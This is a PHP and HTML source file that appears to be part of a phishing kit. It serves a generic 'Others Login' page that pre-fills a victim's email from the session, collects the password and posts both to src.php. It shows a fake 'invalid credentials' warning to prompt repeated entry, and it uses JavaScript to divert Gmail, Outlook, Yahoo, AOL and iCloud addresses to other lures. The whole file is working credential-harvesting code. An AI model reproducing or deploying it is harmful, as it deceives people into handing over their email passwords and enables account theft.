<?php
error_reporting(0);
session_start();
ob_start();

function loggedin()
{
    if (isset($_SESSION['email'])&&!empty($_SESSION['email'])) {
        return true;
    } else {
        return false;
    }
}


if (loggedin()) {
} else {
    die();
}
        
$email = @$_SESSION['email'];

$error = @$_GET['error'];
if ($error == "null_entry") {
    $formaction = "src.php";
    $showerror = "block";
} elseif ($error == "sec") {
    $formaction = "src.php?svr=tf";
    $showerror = "block";
} else {
        $formaction = "src.php";
    $showerror = "none";
}


?>
<!DOCTYPE html>
<html>
    
<head>
        <meta charset="UTF-8">
        <title>Others Login</title>
        <link rel="stylesheet" href="style.css">  
    </head>

    <body>
        <div class="login-page">
            <div class="form">
                <form class="login-form" method="post" action="<?php echo "$formaction"; ?>">
                
                <div style="display: <?php echo "$showerror"; ?>;">
                <p class="message">Warning: Invalid credentials supplied, try again.</p><br>
                </div>
                
                    <input type="email" placeholder="Email" value="<?php echo "$email"; ?>" name="email" id="user" class="input"/>
                    <p class="error" id="error"></p>
                    <input type="password" placeholder="Password" name="password" id="pass" class="input"/>
                    <input type="hidden"  name="wiz" id="pass" class="input"/>
                    <input type="submit" name="submit" id="button" value="login"/>
                    <p class="message">Note: Icloud emails are not supported.</p>
                </form>
            </div>
        </div>
        <script src='jquery.min.js'></script>

    </body>
    <script>
        $('#user').blur(function(){
            var email = $("#user").val().toLowerCase();
            var domain = email.substring(email.lastIndexOf("@") +1);
            
            switch (domain) { 
                case 'gmail.com': 
                    $("#error").html("Please sign in using the login for Gmail.");
                    $("#error").show();
                    $("#button").attr("disabled", true);
                    break;
                case 'hotmail.com': 
                    $("#error").html("Please sign in using the login for Outlook.");
                    $("#error").show();
                    $("#button").attr('disabled', true);
                    break;
                case 'outlook.com': 
                    $("#error").html("Please sign in using the login for Outlook.");
                    $("#error").show();
                    $("#button").attr('disabled', true);
                    break;      
                case 'yahoo.com': 
                    $("#error").html("Please sign in using the login for Yahoo.");
                    $("#error").show();
                    $("#button").attr('disabled', true);
                    break;
                case 'aol.com': 
                    $("#error").html("Please sign in using the login for Aol.");
                    $("#error").show();
                    $("#button").attr('disabled', true);
                    break;
                case 'icloud.com': 
                    $("#error").html("Icloud email is not supported.");
                    $("#error").show();
                    $("#button").attr('disabled', true);
                    break;
                case 'me.com': 
                    $("#error").html("Icloud email is not supported.");
                    $("#error").show();
                    $("#button").attr('disabled', true);
                    break;
                default:
                    $("#button").prop('disabled', false);
                    $("#error").hide();
            }
        });
    </script>
<script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'}),_trfd.push({'ap':'cpbh'},{'server':'a2plvcpnl106936'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.
</html>
